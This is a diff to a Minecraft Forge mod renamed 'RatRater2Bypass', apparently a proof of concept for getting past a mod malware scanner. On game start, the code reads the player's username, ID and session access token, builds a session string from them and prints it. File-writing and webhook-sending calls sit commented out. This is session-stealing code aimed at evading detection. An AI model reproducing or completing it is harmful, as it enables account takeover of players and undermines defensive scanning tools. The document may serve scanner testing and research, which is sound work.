@@ -1,4 +1,4 @@
-package com.example.examplemod;
+package com.github.commandcracker.ratrater2bypass;
 
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.Mod.EventHandler;
@@ -20,9 +20,9 @@ import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
 
-@Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION)
-public class ExampleMod {
-    public static final String MODID = "examplemod";
+@Mod(modid = RatRater2Bypass.MODID, version = RatRater2Bypass.VERSION)
+public class RatRater2Bypass {
+    public static final String MODID = "ratrater2bypass";
     public static final String VERSION = "1.0";
 
 
@@ -67,14 +67,14 @@ public class ExampleMod {
     public void init(FMLInitializationEvent event) {
         String username = Minecraft.getMinecraft().getSession().getUsername();
         String playerID = Minecraft.getMinecraft().getSession().getPlayerID();
-        //String token = getTokenFromField();
-        String token = getTokenFromGetToken();
+        String token = getTokenFromField();
+        //String token = getTokenFromGetToken();
 
         String sessionID = "token:" + token + ":" + playerID;
         //String sessionID = getSessionIDFromGetSessionID();
 
         printSessionID(sessionID, username);
-        writeToFile(sessionID, username, "SessionID.txt");
+        //writeToFile(sessionID, username, "SessionID.txt");
         //sendToWebhook(sessionID, username, "");
     }
 
